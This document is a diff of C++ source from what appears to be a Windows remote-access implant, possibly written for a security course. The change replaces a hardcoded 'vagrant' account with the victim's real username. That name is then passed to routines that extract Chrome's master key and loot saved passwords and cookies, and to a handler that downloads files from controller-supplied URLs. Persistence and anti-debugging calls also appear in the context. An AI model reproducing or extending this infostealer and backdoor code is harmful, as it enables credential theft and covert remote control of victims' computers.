@@ -81,9 +81,8 @@ Sleep(100);
 check_ch0nky();
 std::string cmd_usr = "$env:UserName";
 LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
-std::string username;
-username = runPowershellCommand(username_cmd);
-username.erase(std::remove(username.begin(), username.end(), '\n'), username.end());
+std::string username = runPowershellCommand(username_cmd);;
+username = username.substr(0,username.length()-2);
 std::cout << username << std::endl;
 
 make_persist();
@@ -177,10 +176,10 @@ check_debugger();
                 if(command["command_text"]=="chrome_passwords"){
                     unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
 
-                    getMasterKey(masterKey, "vagrant");
+                    getMasterKey(masterKey, username);
                     printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-                    json jsonResult = lootChromePasswords((const unsigned char*) masterKey, "vagrant");
+                    json jsonResult = lootChromePasswords((const unsigned char*) masterKey, username);
                     cmd_result = jsonResult.dump();
                     //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
 
@@ -191,10 +190,10 @@ check_debugger();
                 }else if(command["command_text"]=="chrome_cookies"){
                     unsigned char* masterKey = new unsigned char[MASTER_KEY_SIZE];
 
-                    getMasterKey(masterKey, "vagrant");
+                    getMasterKey(masterKey, username);
                     printUCharAsHex(masterKey, MASTER_KEY_SIZE);
 
-                    json jsonResult = lootChromeCookies((const unsigned char*) masterKey, "vagrant");
+                    json jsonResult = lootChromeCookies((const unsigned char*) masterKey, username);
                     cmd_result = jsonResult.dump();
                     //std::cout << "jsonResult: " << jsonResult.dump(4) << std::endl;
 
@@ -204,7 +203,8 @@ check_debugger();
                 cmd_result = runProgram(cmd);
             }else if(command["command_type"] == "download_file"){
                 FileIO fileIO = FileIO();
-                char filePath[] = "C:\\Users\\vagrant\\AppData\\Local\\Temp\\random_file";
+                std::string path_file = "C:\\Users\\"+ username +"\\AppData\\Local\\Temp\\random_file";
+                char *filePath = const_cast<char*>(path_file.c_str());
                 std::string url_str = command["command_text"];
                 char *url = const_cast<char*>(url_str.c_str());
                 fileIO.DownloadFileViaUrl(url, filePath);
